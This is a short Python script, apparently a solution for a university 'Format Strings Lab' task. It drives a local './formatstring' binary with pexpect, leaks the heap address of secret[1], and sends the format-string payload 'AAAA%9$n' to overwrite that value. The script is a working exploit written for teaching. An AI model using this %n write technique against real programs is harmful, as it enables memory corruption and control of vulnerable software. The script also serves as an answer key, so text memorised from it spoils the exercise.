# Demonstration of how to complete Task 1 (iii) from the Format Strings Lab
# The first input is secret[1]'s location on heap so as to place the address
# on stack. The second input uses the %n formatter to overwrite the value at
# this address.

from __future__ import print_function

import struct
import pexpect

input1 = ''  # Decimal Input - set later for Task 1 (ii)
input2 = 'AAAA%9$n'   # String input (vulnerability)

# Executable that will be attacked
targetfile = './formatstring'

echo = '' # Return from code
p = pexpect.spawn(targetfile)

# Echo initial output
for i in range(0,5):
	echo = p.readline()
	print(echo, end='')
	if (i ==3): # Grab memory location of secret[1]
		sec_Loc = echo[23:33]
		sec_Loc = sec_Loc.replace(' ','0')
		sec_Loc_dec = int(sec_Loc,0)
print('> Secret[1] location in hex: ' + sec_Loc)
print('> Secret[1] location in dec: ' + str(sec_Loc_dec))
input1 = str(sec_Loc_dec)

# Send first user input
print('> Sending:  ' + input1)
p.sendline(input1)

# Echo program return
for i in range(0,2):
	echo = p.readline()
	print(echo,end='')

# Send second user input
print('> Sending: ' + input2)
p.sendline(input2)

# Echo program return
for i in range(0,5):
	echo = p.readline()
	print(echo,end='')
